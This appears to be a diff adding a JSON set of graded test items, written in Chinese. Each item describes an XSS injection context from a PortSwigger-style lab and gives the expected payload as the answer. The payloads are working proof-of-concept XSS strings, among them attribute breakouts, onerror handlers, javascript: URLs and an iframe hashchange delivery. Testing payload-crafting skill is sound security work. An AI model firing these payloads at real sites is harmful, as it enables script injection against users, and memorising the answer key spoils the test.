@@ -1,0 +1,79 @@
+[
+  {
+    "id": "portswigger-js-string",
+    "input": "反射型 XSS，注入点落在 JS 代码块的字符串 var searchTerms = '...'，尖括号被 HTML 编码但单引号未转义",
+    "expected": "-alert(1)-",
+    "grader": "contains",
+    "keyword": "JS 字符串 breakout"
+  },
+  {
+    "id": "portswigger-dom-document-write",
+    "input": "DOM-based XSS，sink 是 document.write 写入 location.search 的值，尖括号未被 HTML 编码",
+    "expected": "\"><svg onload=alert(1)>",
+    "grader": "contains",
+    "keyword": "document.write sink"
+  },
+  {
+    "id": "portswigger-attribute-double-quote",
+    "input": "反射型 XSS，注入点落在属性值 value=\"...\" 内，双引号未转义，尖括号被 HTML 编码",
+    "expected": "\"><script>alert(1)</script>",
+    "grader": "contains",
+    "keyword": "属性双引号 breakout"
+  },
+  {
+    "id": "auto-20261010233710",
+    "input": "GET 参数 search（首页搜索框）反射进 HTML 文本节点，无任何编码/过滤，服务端直接回显原始输入。",
+    "expected": "<script>alert(1)</script>",
+    "grader": "contains",
+    "keyword": "HTML 文本节点上下文 / 无编码直接注入 script"
+  },
+  {
+    "id": "auto-20261010233853",
+    "input": "文章页评论表单的 comment 字段（textarea，POST /post/comment）持久化存储，渲染回文章页时落在 HTML 文本节点且无任何编码/过滤。",
+    "expected": "<script>alert(1)</script>",
+    "grader": "contains",
+    "keyword": "Stored XSS / 评论持久化 / HTML 文本节点无编码"
+  },
+  {
+    "id": "auto-20261010234041",
+    "input": "GET 参数 search（首页搜索框）。输入有第二落点：由客户端 JS 把 location.search 未编码拼接进 HTML 的属性值内（探针 \"><b>marker</b> 的 <b> 被解析成 DOM，证明双引号属性上下文可 breakout）。",
+    "expected": "\"><img src=x onerror=alert(1)>",
+    "grader": "contains",
+    "keyword": "DOM XSS / 客户端 sink 拼接 location.search / 属性值双引号 breakout / 事件处理器绕 script 不执行"
+  },
+  {
+    "id": "auto-20261010234217",
+    "input": "GET 参数 search（首页搜索框）。输入落在会被当作 HTML 解析的 sink 中且未编码：探针 \"><b>marker</b> 的 <b> 被解析成 DOM 元素、标签消失，引号以字面文本显示，说明是 HTML 文本上下文（非属性值）。",
+    "expected": "<img src=x onerror=alert(1)>",
+    "grader": "contains",
+    "keyword": "DOM XSS / HTML 解析型 sink / script 标签不执行改用事件处理器 onerror"
+  },
+  {
+    "id": "auto-20261010234658",
+    "input": "GET 参数 returnPath（/feedback 页）。客户端用 jQuery 把 returnPath 原样写入页面 Back 链接的 href（探针 returnPath=/post?postId=3 → Back 的 href 精确变为 /post?postId=3，确认 sink）。该 sink 不会自动触发，javascript: 伪协议需用户点击链接才执行。",
+    "expected": "javascript:alert(1)",
+    "grader": "contains",
+    "keyword": "DOM XSS / jQuery 写 anchor href / javascript: 伪协议 / 需用户点击（无自动执行）"
+  },
+  {
+    "id": "auto-20261011000152",
+    "input": "目标首页无输入框；漏洞在客户端：hashchange 事件触发时把 location.hash 未编码传入 jQuery 选择器 sink（HTML 片段被当标记解析）。关键约束：初次加载带 hash 不触发，必须加载后再次改变 hash 才执行。投递需 exploit server iframe：<iframe src=\"https://TARGET/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>。",
+    "expected": "#<img src=x onerror=print()>",
+    "grader": "contains",
+    "keyword": "DOM XSS / hashchange 事件驱动 sink / location.hash 源 / jQuery 选择器 sink / iframe onload 改 hash 投递"
+  },
+  {
+    "id": "auto-20261011002057",
+    "input": "GET 参数 search。反射落在 <input> 的双引号属性值内（value=\"...\"），其中双引号未编码（可 breakout），但 < > 被 HTML 编码为 &lt;&gt;（同一输入在 h1 文本节点里则全部字符都被实体编码）。因角度括号被编码，无法构造新标签。",
+    "expected": "\" autofocus onfocus=alert(1) x=\"",
+    "grader": "contains",
+    "keyword": "属性值上下文 breakout / 角度括号 HTML 编码绕过 / autofocus+onfocus 无交互执行"
+  },
+  {
+    "id": "auto-20261011005829",
+    "input": "Stored XSS：博客评论表单的 website 字段被存入后，回显在 `<a id=\"author\" href=\"用户输入\">名字</a>` 的双引号 href 属性里；双引号被 HTML 编码，无法用 `\"` breakout 出属性/标签。",
+    "expected": "javascript:alert(1)",
+    "grader": "contains",
+    "keyword": "URL 属性上下文用 javascript: 伪协议（无法 breakout 引号时）"
+  }
+]
